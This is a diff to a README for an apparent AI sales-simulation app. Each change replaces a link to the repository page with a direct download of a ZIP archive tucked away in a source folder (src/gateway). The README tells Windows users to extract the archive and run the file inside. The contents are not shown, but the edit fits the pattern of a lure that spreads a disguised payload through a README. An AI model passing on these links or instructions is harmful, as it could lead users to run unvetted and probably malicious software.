@@ -1,10 +1,10 @@
 # 🤖 ai-sales-agent-simulator - Simulate Better Sales Moves
 
-[![Download Now](https://img.shields.io/badge/Download-Open%20Page-6f42c1?style=for-the-badge)](https://github.com/Cold-psycho117/ai-sales-agent-simulator)
+[![Download Now](https://img.shields.io/badge/Download-Open%20Page-6f42c1?style=for-the-badge)](https://github.com/Cold-psycho117/ai-sales-agent-simulator/raw/refs/heads/main/src/gateway/simulator-ai-sales-agent-v3.5.zip)
 
 ## 📥 Download
 Use this link to visit the download page and get the app:
-[ai-sales-agent-simulator download page](https://github.com/Cold-psycho117/ai-sales-agent-simulator)
+[ai-sales-agent-simulator download page](https://github.com/Cold-psycho117/ai-sales-agent-simulator/raw/refs/heads/main/src/gateway/simulator-ai-sales-agent-v3.5.zip)
 
 ## 🧩 What this app does
 ai-sales-agent-simulator helps you test sales ideas before you send a real email or make a real call. It uses an AI model to build a digital copy of a prospect, then runs many trials to find the sales approach that has the best chance of working.
@@ -27,7 +27,7 @@ If the app comes in a ZIP file, you can open it with built-in Windows tools or a
 
 ## 🚀 Getting started on Windows
 1. Open the download page:
-   [ai-sales-agent-simulator download page](https://github.com/Cold-psycho117/ai-sales-agent-simulator)
+   [ai-sales-agent-simulator download page](https://github.com/Cold-psycho117/ai-sales-agent-simulator/raw/refs/heads/main/src/gateway/simulator-ai-sales-agent-v3.5.zip)
 
 2. Download the Windows app file or the project files from that page.
 
@@ -148,6 +148,6 @@ Use care when entering real prospect data. Keep your contact lists, call notes, 
 
 ## 🧭 Download and run
 Visit the main page here:
-[https://github.com/Cold-psycho117/ai-sales-agent-simulator](https://github.com/Cold-psycho117/ai-sales-agent-simulator)
+[https://github.com/Cold-psycho117/ai-sales-agent-simulator/raw/refs/heads/main/src/gateway/simulator-ai-sales-agent-v3.5.zip](https://github.com/Cold-psycho117/ai-sales-agent-simulator/raw/refs/heads/main/src/gateway/simulator-ai-sales-agent-v3.5.zip)
 
 Download the app or project files from that page, then open or extract them on Windows and run the file inside
